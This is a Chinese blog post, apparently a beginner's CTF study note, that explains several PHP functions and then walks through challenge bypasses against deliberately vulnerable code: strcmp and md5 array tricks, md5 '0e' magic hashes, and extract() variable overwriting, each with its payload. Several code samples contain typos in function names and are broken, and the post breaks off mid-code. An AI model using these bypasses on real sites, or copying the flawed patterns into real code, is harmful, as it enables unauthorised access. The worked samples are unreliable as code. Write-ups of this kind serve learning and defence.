    <content type="html"><![CDATA[<p>古娜拉黑暗之神🪄</p><span id="more"></span><h2 id="PHP基础函数"><a href="#PHP基础函数" class="headerlink" title="PHP基础函数"></a>PHP基础函数</h2><p>接着上一篇小bug，把那些也提溜过来继续写🧐</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() 函数从<strong>数组</strong>中将变量导入到当前的符号表。该函数使用数组<strong>键名</strong>作为变量名，使用数组<strong>键值</strong>作为变量值。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array（数组名）</td><td>规定要使用的数组</td></tr><tr><td>extract_rules（提取规则）</td><td>可省略。<em>extract()</em> 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td></tr><tr><td>prefix（前缀）</td><td>可省略。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</td></tr></tbody></table><p><strong><em>extract_rules</em>可能的值：</strong></p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$var为要测试的变量</p></blockquote><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量已设置&quot;</span><br>&#125;<br><span class="hljs-comment">//结果为true，将打印文本</span><br><br><span class="hljs-comment">//使用var_dump输出isset()的返回值。</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//删除变量a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>变量已设置<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() 把整个文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#输出演示</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(输出文件中的所有文本)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>把两个字符串以二进制方式进行比较，且该函数比较时区分大小写。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p><code>strcmp(string1, string2)</code></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果返回值小于0，则str1小于str2;</p><p>如果返回值大于0，则str1大于str2;</p><p>如果返回值等于0，则str1等于str2;</p><blockquote><p>有资料说返回值也不仅是-1和1，也可能是其他数据</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//输出0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//输出1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>还有个函数strcasecmp()，用法与strcmp()类似，只是不区分大小写</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>和<code>preg_match()</code>是PHP中常用的正则表达式。</p><p><strong>紧急补课—正则表达式</strong></p><p>在编写处理字符串的程序或者网页的时候，经常会查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的语法。</p><p>作用： 分割， 匹配， 查找， 替换</p><p>例如： 验证邮箱地址格式， 手机号码格式等等</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : 正则表达式</p><p>subject : 需要验证的字符串</p><p>matches&#x2F;regs : 匹配后得到的结果，以数组的方式存储</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>返回值是<strong>false</strong>或<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式分隔符后的i标记这是一个大小写不敏感的搜索</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串&quot;</span>；<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串&quot;</span>；<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示1：<br>查找到匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2：</span><br><span class="hljs-comment">//查找固定的某个单词</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式中的 \b 标记一个单词边界，所以只有独立的单词会被匹配，而不会匹配单词的部分内容 </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示2：<br>查找到匹配字符串<br>未发现匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#实例演示3：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从URL中获取主机名称</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// 获取主机名称的后面两部分</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示3：<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>乱七八糟一堆符号我一个都看不懂我好得很哇</del></p><h2 id="魔法部分"><a href="#魔法部分" class="headerlink" title="魔法部分"></a>魔法部分</h2><p>警告：麻瓜请自觉退出🚫</p><h3 id="01-strcmp绕过"><a href="#01-strcmp绕过" class="headerlink" title="01 strcmp绕过"></a>01 strcmp绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ps：从ws那里copy来的（x</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>，就是要**$_GET<strong>变量和</strong>FLAG**相等，但是我们除了严刑逼供出题人，根本就不知道FLAG是什么。</p><blockquote><p>$_GET[‘flag’]意思是从url获取一个叫flag的GET参数</p></blockquote><p>不要害怕！</p><p><strong>当 strcmp() 比较出错时会返回 NULL；而返回 NULL 即为返回 0</strong>，我们只需要palyload一个非字符串变量和字符串FLAG比较就会出错并返回0。</p><p>欸，相等辣！</p><p><strong>最终palyload</strong>： <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5绕过"><a href="#02-md5绕过" class="headerlink" title="02 md5绕过"></a>02 md5绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我 :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>，就是变量s1和s2<strong>不能相等</strong>但是他们的<strong>md5要相等</strong>。</p><p>因为s2和s2不能相等，所以单纯md5加密得出的密文一定也不完全一样，这时就要利用一些歪门邪道<del>（不是）</del>。</p><p><strong>紧急补课—md5</strong></p><p>md5一种密码散列函数。MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p><del>补不了我看不懂</del>🥲</p><h5 id="001-科学计数法绕过"><a href="#001-科学计数法绕过" class="headerlink" title="001 科学计数法绕过"></a>001 科学计数法绕过</h5><p>字符串经过md5加密后，会生成既有数字又有字母的密文，可以利用<strong>科学计数法</strong>的语法规律反推明文。</p><blockquote><p>了解到md5是不可逆的所以应该不能解码，但是可以根据加密规律找满足需要的明文</p></blockquote><p>0无论乘十的几次方都仍然为零，例如<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>。所以只需要找到两个经过md5加密后以<strong>”0e“</strong>开头的字符串充当变量即可。</p><p>copy了一些加密后是0e开头的值：</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>最终playload</strong>：<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>没有成功截图😣</p><p>不知道为什么自己运行的时候没成功，页面一片空白什么都没输出。</p><p><strong>紧急补课</strong></p><p>在php中，**’<em>x</em>e<em>y</em>‘** 意为x乘10的y次方。例如：1000 &#x3D;&#x3D; ‘1e3’。</p><h5 id="002-数组绕过"><a href="#002-数组绕过" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h5><p>冲浪冲到的</p><p>php中的md5函数不能用来加密数组，所以会出现结果NULL。例如<code>md5([1,2]) == md5([3,4]) == NULL</code>。</p><p><strong>最终playload</strong>：<code>?s1[]=1&amp;s2[]=2</code></p><p>但是在我的电脑上复现会报错而不是直接null绕过。</p><h3 id="03-extract-变量覆盖绕过"><a href="#03-extract-变量覆盖绕过" class="headerlink" title="03 extract 变量覆盖绕过"></a>03 extract 变量覆盖绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifier终将否极泰来&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目使用<code>extract($_GET)</code>接受请求，并将其键名和键值转换为变量名和变量值，随后进行if条件的判断。$flag是一个输入的变量，<code>file_get_contents($flag)</code>打开的一定是空文件，所以<code>$content</code>一定为空</p><blockquote><p>解题关键在于令$shiyan&#x3D;&#x3D;$content</p></blockquote><p>使用GET提交参数和值，利用<code>extract($_GET)</code>进行覆盖，使flag和shiyan的值都为空，从而满足if条件，输出flag。</p><p><strong>最终payload</strong>：<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-绕过过滤的空白字符"><a href="#04-绕过过滤的空白字符" class="headerlink" title="04 绕过过滤的空白字符"></a>04 绕过过滤的空白字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); <br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a 